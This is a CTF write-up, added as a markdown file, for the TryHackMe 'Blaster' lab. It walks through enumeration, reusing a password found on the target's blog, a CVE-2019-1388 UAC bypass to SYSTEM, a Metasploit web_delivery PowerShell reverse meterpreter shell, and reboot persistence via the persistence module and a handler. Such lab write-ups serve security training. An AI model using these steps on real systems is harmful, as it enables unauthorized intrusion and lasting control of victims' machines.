@@ -1,0 +1,257 @@
+# Blaster
+
+Room: [Blaster](https://tryhackme.com/room/blaster)
+
+<img width="941" height="206" alt="image" src="https://github.com/user-attachments/assets/94944600-8cab-45af-b015-7e3279e8221a" />
+
+## Mission Start!
+
+Throughout this room, we'll be looking at alternative modes of exploitation without the use of Metasploit or really exploitation tools in general beyond nmap and dirbuster.
+
+To wrap up the room, we'll be pivoting back to these tools for persistence and additional steps we can take.
+
+*This room is a remix of my previous room [Retro](https://tryhackme.com/room/retro) with some complications I added to that room having been removed. For increased difficulty and an exercise in patience, check that room out after this. In addition, this room is the sequel to [Ice](https://tryhackme.com/room/ice).: DarkStar747*
+
+Start the Lab Machine and connect to the TryHackMe Server by OpenVPN: `sudo openvpn FILENAME`.
+
+You can check how to connect through OpenVPN by this room: [OpenVPN](https://tryhackme.com/room/openvpn)
+
+## Activate Forward Scanners and Launch Proton Torpedoes
+
+Run nmap scan: `nmap -Pn TARGET_IP`
+
+<img width="328" height="106" alt="image" src="https://github.com/user-attachments/assets/b02e7843-2ae2-4520-8bfd-06d1960ba1ca" />
+
+**Note**: `-Pn` because to not ping it as it has Windows Firewall enabled so without this flag it will not respond, it will say that the host seems down.
+
+### Answer the questions below
+
+1. How many ports are open on our target system?
+
+2
+
+2. Looks like there's a web server running, what is the title of the page we discover when browsing to it?
+
+IIS Windows Server
+
+<img width="760" height="352" alt="image" src="https://github.com/user-attachments/assets/e27f30e7-afcf-4751-a304-1916e5fc6631" />
+
+3. Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?
+
+`/retro`
+
+First I tried the gobsuter command with common wordlist that did not show any result: `gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt`
+
+Then seeing the hint, now using the small wordlist: `gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
+
+<img width="545" height="175" alt="image" src="https://github.com/user-attachments/assets/93b43f92-4009-40a2-9790-fe7b5e47f366" />
+
+4. Navigate to our discovered hidden directory, what potential username do we discover?
+
+Wade
+
+<img width="764" height="398" alt="image" src="https://github.com/user-attachments/assets/b002c3d2-b90f-4239-b745-211639974699" />
+
+5. Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?
+
+parzival
+
+First scrolling down we see second last post which he says about forgetting the avatar name when he logs in, so the goal is to find the avatar name.
+
+<img width="565" height="254" alt="image" src="https://github.com/user-attachments/assets/00469e06-5272-4c45-82df-773a01058aee" />
+
+Clicking the "Wade" link goes to the Wade Profile `http://TARGET_IP/retro/index.php/author/wade/` about his posts and comments, so we can see that he has commented on the same post "Ready Player One" where he mentioned about logging in and forgetting the avatar name.
+
+<img width="574" height="293" alt="image" src="https://github.com/user-attachments/assets/b1cda2d3-8391-40b3-9e83-2207df9c941c" />
+
+Opening this link `http://TARGET_IP/retro/index.php/2019/12/09/ready-player-one/#comment-2` shows us the comment indicating the avatar name:
+
+<img width="578" height="195" alt="image" src="https://github.com/user-attachments/assets/1e9029b3-1236-4569-9b56-c10fd23532fb" />
+
+6. Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?
+
+Command: `xfreerdp /v:TARGET_IP /u:Wade /p:'parzival'` and open the user.txt file
+
+<img width="1239" height="358" alt="image" src="https://github.com/user-attachments/assets/0b7cab07-00ad-4a3a-b61d-fd4d71c22088" />
+
+## Breaching the Control Room
+
+### Answer the questions below
+
+1. When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?
+
+CVE-2019-1388
+
+I could not find the CVE in the Windows even watching the official walkthrough so I found out that other people are also having this issue that they cannot see the CVE in Internet Explorere History. So I got to know from the Hint and checking the walkthrough.
+
+Original way is to open the Internet Explorer, click the Start icon and you see the CVE under History of 2 weeks ago but in mine I dont see that.
+
+<img width="505" height="225" alt="image" src="https://github.com/user-attachments/assets/0d256d37-7d38-45bd-a9c7-5ebfa1561a39" />
+
+You can also check there is an application named `hhupd` so you can search about it in Google and you will get to know about this CVE.
+
+2. Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?
+
+`hhupd`
+
+<img width="390" height="152" alt="image" src="https://github.com/user-attachments/assets/875cf387-b175-4192-bf3d-b6a7f61bb735" />
+
+3. Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!
+
+CVE-2019-1388 is a Windows User Account Control (UAC) bypass vulnerability. It lets a normal user gain Administrator (SYSTEM-level) privileges without knowing the administrator password.
+
+When Windows wants to verify a program, it shows a certificate.
+
+That certificate has a "View Certificate" button.
+
+Microsoft forgot to properly restrict what users could do from that certificate window.
+
+An attacker can abuse it to open Internet Explorer with administrator privileges.
+
+From Internet Explorer, they can:
+1. Open File → Open
+2. Browse to C:\Windows\System32
+3. Run cmd.exe
+
+Since Internet Explorer is already running as Administrator, Command Prompt also opens as Administrator.
+
+Now the attacker has full control of the computer.
+
+You can check about this vulnerability on this website [NIST CVE-2019-1388 Detail](https://nvd.nist.gov/vuln/detail/cve-2019-1388)
+
+Now for exploiting this machine, Open hhupd exe and click "Show More Details".
+
+<img width="249" height="257" alt="image" src="https://github.com/user-attachments/assets/225056ee-abb3-4ec5-9227-49a40e696075" />
+
+Click on show about the publishers certificate.
+
+<img width="238" height="275" alt="image" src="https://github.com/user-attachments/assets/42f2e160-0171-46d6-ae87-f2d33cfd959d" />
+
+Click on the CA Issued by "VeriSign Commercial Software Publishers CA"
+
+<img width="244" height="281" alt="image" src="https://github.com/user-attachments/assets/8e265049-1dae-4bdc-965a-f0a11ffbc506" />
+
+A browser page will open up.
+
+<img width="510" height="203" alt="image" src="https://github.com/user-attachments/assets/a6f0ea96-5c4d-40d2-bbe3-cc6392eb939d" />
+
+Click the Settings Gear icon and select "File" and then "Save as", then a dialog box will appear indicating that a file is not available.
+
+<img width="511" height="233" alt="image" src="https://github.com/user-attachments/assets/1fe974f3-e7ff-4a77-93a9-5194b0169bda" />
+
+Then save the Filename as `c:\Windows\system32\*.*` and press Save so we can open this directory indirectly.
+
+<img width="514" height="250" alt="image" src="https://github.com/user-attachments/assets/c7b86e57-4616-4d83-b56d-10259ac9f500" />
+
+Now search "cmd" at the upper right space indicating Search icon, scroll down to get the cmd.
+
+<img width="512" height="237" alt="image" src="https://github.com/user-attachments/assets/1fe86ad0-83af-486f-a0c2-ad5487e335ae" />
+
+Open the cmd and you have gained Administrator rights.
+
+<img width="511" height="257" alt="image" src="https://github.com/user-attachments/assets/20d2080b-7387-4002-a305-42da4e7885e2" />
+
+4. Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?
+
+<img width="229" height="74" alt="image" src="https://github.com/user-attachments/assets/5291cebe-63b8-4af1-b816-5fe252a29140" />
+
+5. Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!
+
+Go to the directory by command `cd c:\Users\Administrator\Desktop` and then see the contents by command `type root.txt`
+
+<img width="489" height="234" alt="image" src="https://github.com/user-attachments/assets/e0bf4d7a-1971-4a90-80a3-1d1c818bacd4" />
+
+## Adoption into the Collective
+
+### Answer the questions below
+
+1. Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
+
+Open a new session in your terminal and type `msfconsole` to launch Metasploit.
+
+<img width="432" height="338" alt="image" src="https://github.com/user-attachments/assets/7a53f655-9c20-4d77-96cb-e75f057ca7c3" />
+
+Select the payload by command: `use exploit/multi/script/web_delivery`
+
+<img width="305" height="38" alt="image" src="https://github.com/user-attachments/assets/615c9720-4c0d-41a1-bddc-376070c4bfd5" />
+
+2. First, let's set the target to PSH (PowerShell). Which target number is PSH?
+
+Command: `show targets` and answer is 2.
+
+<img width="275" height="194" alt="image" src="https://github.com/user-attachments/assets/1adb2b25-2431-4969-9997-e60ad29bf19a" />
+
+Set your target: `set target 2`
+
+<img width="275" height="27" alt="image" src="https://github.com/user-attachments/assets/611a3158-1df4-4aeb-8518-a93a7379e29b" />
+
+Metasploit can generate different types of payloads, so we will create a PowerShell Command that downloads or executes the payload directly in memory and PowerShell is already installed on most Windows systems.
+
+3. After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.
+
+Check your tun0 IP address by command `ifconfig` then set your LHOST by `set LHOST TUN0_IP` and LPORT is already set to `4444` but you can verify by `set LPORT 4444`
+
+<img width="681" height="94" alt="image" src="https://github.com/user-attachments/assets/78591713-82fd-42eb-8b6b-303570236b15" />
+
+<img width="763" height="633" alt="image" src="https://github.com/user-attachments/assets/5234e007-575c-45d7-9ded-da345e40103d" />
+
+4. Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.
+
+<img width="1138" height="240" alt="image" src="https://github.com/user-attachments/assets/c766cdec-1616-4dc2-aaca-d3f8481f5996" />
+
+5. Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned.
+
+Paste the chunk from "powershell" to "==" to the cmd of Administrator we exploited so it will give us a reverse shell and a meterpreter session will open.
+
+<img width="1714" height="499" alt="image" src="https://github.com/user-attachments/assets/5919762d-7a7e-49e3-aea4-327741bba0cf" />
+
+Select the first session by `session -i 1`
+
+<img width="292" height="50" alt="image" src="https://github.com/user-attachments/assets/4b0c7608-fff5-4694-b76a-2c16392d6a80" />
+
+6. Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup.
+
+`run persistence -X`
+
+I checked this hint website [Meterpreter Service](https://www.offsec.com/metasploit-unleashed/meterpreter-service/) where I understood by command `run persistence -h` we can see options we can use with persistence so there was an option with `-X` flag where it automatically start the agent when the system boots so it answers the questions that which command we can use that automatically starts when the system boots.
+
+7. Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!
+
+I did not try this but here is the full workflow:
+
+Background the Meterpreter Session
+
+```
+meterpreter > background
+```
+
+Load the Persistence Module: `use exploit/windows/local/persistence`
+
+Configure the Module
+
+```
+show options
+set SESSION 1
+set LHOST <TUN0_IP>
+set LPORT 4444
+set STARTUP SYSTEM
+```
+
+Run the Exploit: `exploit`
+
+Load the Multi Handler `use exploit/multi/handler`
+
+Configure the Handler:
+
+```
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <TUN0_IP>
+set LPORT 4444
+```
+
+Start the Listener: `run`
+
+Reboot the Target: `reboot` or from Windowd CMD `shutdown /r /t 0`
+
+Once the target restarts, the Meterpreter session should automatically reconnect to the handler.
+
